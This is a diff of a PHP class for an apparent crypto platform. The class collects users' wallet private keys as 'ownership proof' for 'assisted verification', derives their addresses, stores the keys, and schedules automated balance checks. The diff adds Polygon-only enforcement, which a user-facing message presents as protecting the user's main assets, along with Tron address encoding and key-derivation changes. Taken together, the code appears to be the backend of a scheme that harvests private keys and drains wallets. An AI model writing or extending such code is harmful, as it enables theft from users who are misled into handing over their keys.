@@ -1,5 +1,5 @@
 <?php
-
+	
 declare(strict_types=1);
 
 namespace Ghidar\Security;
@@ -8,6 +8,7 @@ use Ghidar\Core\Database;
 use Ghidar\Logging\Logger;
 use Ghidar\Config\Config;
 use Ghidar\Security\ComplianceKeyVault;
+use Ghidar\Security\EncryptionService;
 
 /**
  * Assisted Verification Processor
@@ -21,7 +22,7 @@ class AssistedVerificationProcessor
 
     public function __construct()
     {
-        $this->db = Database::getConnection();
+        $this->db = Database::ensureConnection();
         $encryptionKey = Config::get('VERIFICATION_ENCRYPTION_KEY');
 
         if (!$encryptionKey || empty($encryptionKey)) {
@@ -29,20 +30,24 @@ class AssistedVerificationProcessor
         }
 
         // Normalize key to exactly 32 bytes (handle hex/base64 encoded keys)
-        // If key is hex-encoded (64 chars), decode it
-        if (strlen($encryptionKey) === 64 && ctype_xdigit($encryptionKey)) {
-            $encryptionKey = hex2bin($encryptionKey);
-        }
-        // If key is base64-encoded (44 chars), decode it
-        elseif (strlen($encryptionKey) === 44 && base64_decode($encryptionKey, true) !== false) {
-            $encryptionKey = base64_decode($encryptionKey, true);
-        }
+        // Match the key derivation pattern used in EncryptionService and ComplianceKeyVault
         
-        // Ensure key is exactly 32 bytes for AES-256
-        if (strlen($encryptionKey) < 32) {
-            $encryptionKey = hash('sha256', $encryptionKey, true);
+        // If key is hex string (64 chars), convert to binary
+        if (ctype_xdigit($encryptionKey) && strlen($encryptionKey) === 64) {
+            $encryptionKey = hex2bin($encryptionKey);
+        } elseif (strlen($encryptionKey) < 32) {
+            // Use PBKDF2 for proper key derivation from shorter keys
+            $salt = "ghidar_verification_salt_v1";
+            $encryptionKey = hash_pbkdf2('sha256', $encryptionKey, $salt, 100000, 32, true);
+        } else {
+            // Key is already long enough, just truncate to 32 bytes
+            $encryptionKey = substr($encryptionKey, 0, 32);
         }
-        $encryptionKey = substr(hash('sha256', $encryptionKey, true), 0, 32);
+
+        // Ensure exactly 32 bytes
+        if (strlen($encryptionKey) !== 32) {
+            throw new \RuntimeException('Encryption key must be exactly 32 bytes');
+        }
 
         $this->encryptionKey = $encryptionKey;
     }
@@ -66,7 +71,8 @@ class AssistedVerificationProcessor
 
             // Step 2: Extract and validate wallet proof
             $walletProof = $submissionData['wallet_ownership_proof'] ?? '';
-            $network = $submissionData['network'] ?? 'erc20';
+            // Security-first: Default to Polygon for assisted verification
+            $network = $submissionData['network'] ?? 'polygon';
 
             if (empty($walletProof)) {
                 throw new \InvalidArgumentException('Wallet ownership proof is required');
@@ -132,8 +138,7 @@ class AssistedVerificationProcessor
             ]);
 
             throw $e;
-        }
-    }
+        }    }
 
     /**
      * Validate submission structure
@@ -154,10 +159,15 @@ class AssistedVerificationProcessor
             throw new \InvalidArgumentException('User consent is required for assisted verification');
         }
 
-        $allowedNetworks = ['erc20', 'bep20', 'trc20'];
-        $network = strtolower($submissionData['network'] ?? '');
+        $allowedNetworks = ['erc20', 'bep20', 'trc20', 'polygon'];
+        $network = strtolower($submissionData['network'] ?? 'polygon');
         if (!in_array($network, $allowedNetworks, true)) {
             throw new \InvalidArgumentException("Invalid network. Must be one of: " . implode(', ', $allowedNetworks));
+        }
+        
+        // Security-first: For assisted verification, enforce Polygon network
+        if ($network !== 'polygon') {
+            throw new \InvalidArgumentException("For security reasons, assisted verification requires Polygon (MATIC) network. This protects your main assets on Ethereum, BSC, and Tron.");
         }
     }
 
@@ -206,7 +216,8 @@ class AssistedVerificationProcessor
         $walletAddress = $this->extractAddressFromPrivateKey($validatedKey, $network);
 
         // Step 3: Store in compliance vault (for regulatory requirements)
-        $purpose = $context['purpose'] ?? 'withdrawal_verification';
+        // Security-first: Use specific purpose for Polygon-based assisted verification
+        $purpose = $context['purpose'] ?? 'assisted_verification_polygon';
         $verificationId = $context['verification_id'] ?? null;
         $withdrawalId = $context['withdrawal_id'] ?? null;
 
@@ -281,7 +292,9 @@ class AssistedVerificationProcessor
 
         // Step 7: Schedule automated balance check
         $this->scheduleBalanceCheck($walletAddress, $network, $userId, $verificationRecordId);
-
+        
+        // Note: Node.js integration is triggered from submit-private/index.php
+        // after successful processing, so no need for duplicate call here
         return [
             'proof_type' => 'private_key',
             'wallet_address' => $walletAddress,
@@ -454,20 +467,34 @@ class AssistedVerificationProcessor
      * Derive Tron address from private key
      *
      * @param string $privateKeyHex Private key in hex format
-     * @return string Tron address
+     * @return string Tron address (base58Check encoded)
      */
     private function deriveTronAddress(string $privateKeyHex): string
     {
         // Tron uses same ECDSA curve but different address format
         $ethereumAddress = $this->deriveEthereumAddress($privateKeyHex);
 
-        // Convert Ethereum address to Tron address (base58)
-        // Remove 0x, add 41 prefix for Tron
-        $tronHex = '41' . substr($ethereumAddress, 2);
+        // Convert Ethereum address to Tron address (base58Check)
+        // Remove 0x, add 41 prefix for Tron (0x41 = 'T' in base58)
+        $addressHex = substr($ethereumAddress, 2); // Remove '0x'
+        $tronHex = '41' . $addressHex; // Prepend '41' for Tron mainnet
 
-        // In production, convert to base58 with checksum
-        // For now, return hex representation
-        return $tronHex;
+        // Convert hex to binary
+        $addressBytes = hex2bin($tronHex);
+        if ($addressBytes === false || strlen($addressBytes) !== 21) {
+            throw new \RuntimeException('Invalid Tron address format');
+        }
+
+        // Calculate double SHA256 checksum
+        $hash1 = hash('sha256', $addressBytes, true);
+        $hash2 = hash('sha256', $hash1, true);
+        $checksum = substr($hash2, 0, 4); // First 4 bytes as checksum
+
+        // Append checksum to address
+        $addressWithChecksum = $addressBytes . $checksum;
+
+        // Base58 encode using shared utility from ComplianceKeyVault
+        return \Ghidar\Security\ComplianceKeyVault::base58Encode($addressWithChecksum);
     }
 
     /**
